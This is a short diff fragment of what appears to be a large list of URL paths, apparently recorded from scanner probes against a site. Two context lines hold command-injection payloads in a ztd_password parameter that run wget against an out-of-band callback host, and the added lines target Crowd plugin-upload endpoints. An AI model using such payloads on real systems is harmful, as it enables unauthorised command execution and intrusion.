@@ -35063,3 +35063,5 @@ http://64.233.170.113/
 /index.php/com.example.TestService?route=checkout/cart&amp;srsltid=AfmBOoqhC_hh6L8s7Der5R6-sDxrLYeI6jV7-Qa1EBMpunSL5M9TnMuN
 /index.php/Collector/nms/addModifyZTDProxy?route=checkout/cart&amp;srsltid=AfmBOorhz1jGrSEFBW8-ypSix1qVmG-F4cJ_unlXxJjTYVFMaLI2aQ9k&ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d1ispgjpu1sstbigcp20e9fnrppcs9ngj.oast.online)
 /index.php/Collector/nms/addModifyZTDProxy?route=checkout/cart&amp;srsltid=AfmBOoqhC_hh6L8s7Der5R6-sDxrLYeI6jV7-Qa1EBMpunSL5M9TnMuN&ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d1ispgjpu1sstbigcp20xsria7st4wtk5.oast.online)
+/index.php/crowd/plugins/servlet/exp?route=checkout/cart&route=checkout/cart
+/index.php/crowd/admin/uploadplugin.action?route=checkout/cart&route=checkout/cart
